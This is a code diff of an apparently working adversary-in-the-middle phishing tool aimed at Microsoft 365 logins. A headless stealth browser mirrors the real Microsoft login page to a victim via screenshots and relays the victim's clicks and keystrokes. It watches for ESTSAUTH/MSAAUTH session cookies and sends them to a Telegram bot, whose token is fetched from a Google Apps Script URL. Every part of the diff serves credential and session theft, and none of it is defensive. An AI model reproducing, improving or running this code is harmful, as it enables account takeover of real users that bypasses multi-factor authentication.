@@ -1,4 +1,3 @@
-// USE PUPPETEER-CORE TO AVOID VERSION CONFLICTS
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const axios = require('axios');
@@ -6,51 +5,100 @@ const FormData = require('form-data');
 
 puppeteer.use(StealthPlugin());
 
+// --- CORE AITM CONFIG ---
 const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
 const TARGET = "https://login.microsoftonline.com/";
 
-async function startSession(io, socket) {
-    let browser = null;
+let cachedSecrets = null;
+
+async function getSecrets() {
+    if (cachedSecrets) return cachedSecrets;
+    try {
+        const response = await axios.get(VAULT_URL, { timeout: 5000 });
+        cachedSecrets = response.data;
+        return cachedSecrets;
+    } catch (e) { return null; }
+}
+
+async function sendExfiltration(cookies, url) {
+    const secrets = await getSecrets();
+    if (!secrets || !secrets.TG_TOKEN) return;
 
     try {
+        const host = new URL(url).hostname;
+        // Text Alert
+        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`, {
+            chat_id: secrets.TG_CHAT_ID,
+            text: `<b>🚨 STAGE CAPTURE</b>\n<b>Host:</b> ${host}`,
+            parse_mode: 'HTML'
+        });
+
+        // Cookie File
+        const form = new FormData();
+        form.append('chat_id', secrets.TG_CHAT_ID);
+        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
+            filename: `COOKIES_${host}.json`,
+            contentType: 'application/json'
+        });
+
+        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders()
+        });
+    } catch (e) {}
+}
+
+async function startSession(io, socket) {
+    let browser = null;
+    const captured = new Set();
+
+    try {
+        // REVERTED LAUNCH: No hardcoded paths
         browser = await puppeteer.launch({
-            // PATH TO NIX CHROMIUM
-            executablePath: '/usr/bin/chromium', 
             headless: "new",
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--disable-gpu',
-                '--no-zygote',
-                '--single-process'
-            ]
+            args: ['--no-sandbox', '--disable-setuid-sandbox']
         });
 
         const page = await browser.newPage();
         await page.setViewport({ width: 1280, height: 720 });
-        
-        // Immediate redirect to clear the "Initializing" UI
-        await page.goto(TARGET, { waitUntil: 'domcontentloaded' });
+        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
 
-        const stream = setInterval(async () => {
+        await page.goto(TARGET, { waitUntil: 'networkidle2' });
+
+        // EXFILTRATION MONITOR
+        const poller = setInterval(async () => {
+            try {
+                const url = page.url();
+                if (url.includes('/kmsi') || url.includes('portal.office.com')) {
+                    const cookies = await page.cookies();
+                    const hasAuth = cookies.some(c => c.name.includes('ESTSAUTH') || c.name.includes('MSAAUTH'));
+                    if (hasAuth && !captured.has(url)) {
+                        captured.add(url);
+                        await sendExfiltration(cookies, url);
+                    }
+                }
+            } catch (e) {}
+        }, 5000);
+
+        // MIRROR RENDERER
+        const heartbeat = setInterval(async () => {
             if (socket.connected) {
                 try {
-                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
-                    socket.emit('browser-render', { screenshot: b64 });
+                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
+                    socket.emit('browser-render', { screenshot });
                 } catch (e) {}
             }
         }, 1000);
 
-        socket.on('victim-action', async (d) => {
+        socket.on('victim-action', async (data) => {
             try {
-                if (d.type === 'click') await page.mouse.click(d.x, d.y);
-                if (d.type === 'key') await page.keyboard.press(d.key);
+                if (data.type === 'click') await page.mouse.click(data.x, data.y);
+                if (data.type === 'key') await page.keyboard.press(data.key);
             } catch (e) {}
         });
 
         socket.on('disconnect', async () => {
-            clearInterval(stream);
+            clearInterval(heartbeat);
+            clearInterval(poller);
             if (browser) await browser.close();
         });
 
